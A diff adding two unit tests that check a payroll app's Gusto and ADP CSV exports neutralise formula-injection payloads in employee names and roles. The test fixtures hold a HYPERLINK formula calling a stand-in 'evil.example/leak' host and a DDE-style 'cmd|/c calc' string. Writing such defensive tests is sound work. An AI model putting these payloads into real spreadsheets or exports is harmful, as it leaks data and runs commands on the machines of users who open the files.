@@ -70,6 +70,32 @@ class TestPayrollNullWageExclusion(unittest.TestCase):
         self.assertEqual(resp.headers["X-Excluded-Staff"], "EMP-PR33-NULL")
         self.assertNotIn("Null Wage Person", resp.text)
 
+    def test_02_gusto_export_neutralizes_a_formula_shaped_employee_name_and_role(self):
+        """A name/role starting with '=', '+', '-' or '@' is written '-prefixed, never as a live formula cell."""
+        row = _employee("EMP-PR33-FORMULA", '=HYPERLINK("http://evil.example/leak","click")', 15.0)
+        row["role"] = "+1;@SUM(A1:A99)"
+        with patch.object(ShiftFlowRepository, "list_employees", return_value=[row]):
+            resp = self.client.get("/api/payroll/export/gusto", params={"facility_id": FACILITY_ID})
+
+        self.assertEqual(resp.status_code, 200)
+        # The raw CSV bytes must never contain a cell that starts with a formula trigger:
+        # every line that mentions this employee's data should instead carry the
+        # guarded, single-quote-prefixed text.
+        self.assertIn('"\'=HYPERLINK', resp.text)
+        self.assertIn("'+1;@SUM(A1:A99)", resp.text)
+        self.assertNotIn(',=HYPERLINK', resp.text)
+        self.assertNotIn(",+1;@SUM", resp.text)
+
+    def test_03_adp_export_neutralizes_a_formula_shaped_employee_name(self):
+        """The ADP export applies the same formula guard to the employee name column."""
+        row = _employee("EMP-PR33-FORMULA2", "@SUM(1+1)*cmd|'/c calc'!A0", 15.0)
+        with patch.object(ShiftFlowRepository, "list_employees", return_value=[row]):
+            resp = self.client.get("/api/payroll/export/adp", params={"facility_id": FACILITY_ID})
+
+        self.assertEqual(resp.status_code, 200)
+        self.assertIn("'@SUM(1+1)*cmd", resp.text)
+        self.assertNotIn(",@SUM(1+1)", resp.text)
+
 
 if __name__ == "__main__":
     unittest.main()
